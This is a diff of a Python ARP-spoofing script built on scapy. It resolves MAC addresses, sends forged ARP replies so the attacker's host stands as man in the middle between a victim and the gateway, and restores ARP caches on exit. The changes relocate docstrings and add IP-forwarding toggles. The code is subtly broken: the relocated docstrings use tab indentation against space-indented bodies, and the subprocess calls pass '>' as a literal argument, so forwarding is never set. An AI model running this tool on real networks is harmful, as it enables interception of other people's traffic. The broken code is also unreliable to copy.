@@ -5,13 +5,14 @@ import time
 import subprocess
 import sys
 
-"""
-function sends ARP request to network gateway to obtain device MAC addresses
-:param dest_ip: the IP of the host, or IP range for which MAC addresses are to be obtained
-:return: a list containing a dictionary entry with key-value pairs for IP and MAC addresses for each host
-"""
+
 
 def get_mac(dest_ip):
+	"""
+	function sends ARP request to network gateway to obtain device MAC addresses
+	:param dest_ip: the IP of the host, or IP range for which MAC addresses are to be obtained
+	:return: a list containing a dictionary entry with key-value pairs for IP and MAC addresses for each host
+	"""
     arp_request = scapy.ARP(pdst=dest_ip)
     broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast_packet = broadcast_request / arp_request
@@ -28,38 +29,39 @@ def get_mac(dest_ip):
         return reply_dict_list
 
 
-"""
-function performs the ARP response to target in order to establish your host as the man in the middle
-:param target_ip: the IP address of the victim you are posing at the router to
-:param target_mac: the MAC address of the victim
-:param source_ip: the IP address you are impersonating
-"""
+
 
 def spoof_arp(target_ip, target_mac, source_ip):
+	"""
+	function performs the ARP response to target in order to establish your host as the man in the middle
+	:param target_ip: the IP address of the victim you are posing at the router to
+	:param target_mac: the MAC address of the victim
+	:param source_ip: the IP address you are impersonating
+	"""
     arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
     scapy.send(arp_response_packet, verbose=False)
 
 
-"""
-function performs the ARP response to target in order to restore its original ARP cache
-:param target_ip: the IP address of the victim you are posing at the router to
-:param target_mac: the MAC address of the victim
-:param source_ip: the IP address you are impersonating
-"""
+
 
 def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
-    #target_mac = get_mac(target_ip)
-    #gateway_mac = get_mac(gateway_ip)
+    """
+	function performs the ARP response to target in order to restore its original ARP cache
+	:param target_ip: the IP address of the victim you are posing at the router to
+	:param target_mac: the MAC address of the victim
+	:param source_ip: the IP address you are impersonating
+	"""
     arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
     scapy.send(arp_response_packet, verbose=False)
 
 
-"""
-function gets arguments from the terminal
-:return: returns a variable containing the arguments from object ArgumentParser()'s method parse_args()
-"""
+
 
 def get_arguments():
+	"""
+	function gets arguments from the terminal
+	:return: returns a variable containing the arguments from object ArgumentParser()'s method parse_args()
+	"""
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target_ip", help="the IP address of the target machine")
     parser.add_argument("-s", "--source", dest="source_ip", help="the IP address of the network gateway "
@@ -73,19 +75,19 @@ def get_arguments():
         return arguments
 
 
-"""
-runs the script and displays host and target data in the terminal
-"""
+
 
 def execute():
+	"""
+	runs the script and displays host and target data in the terminal
+	"""
     arguments = get_arguments()
 
     target_mac_list = get_mac(arguments.target_ip)
     source_mac = get_mac(arguments.source_ip)[0]["mac"]
-
+    
     subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
     packet_count = 0
-
     print("\n")
     print("               " + "\t\t" + "IP address  " + "\t" + "MAC address")
     print("\n")
@@ -111,6 +113,8 @@ def execute():
                     restore_arp(dict_entry["ip"], dict_entry["mac"], arguments.source_ip, source_mac)
                     restore_arp(arguments.source_ip, source_mac, dict_entry["ip"], dict_entry["mac"])
             print("[+] CTRL + C detected, exiting and restoring ARP configuration")
+            subprocess.run(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])
+            subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"])
             sys.exit(0)
 
 
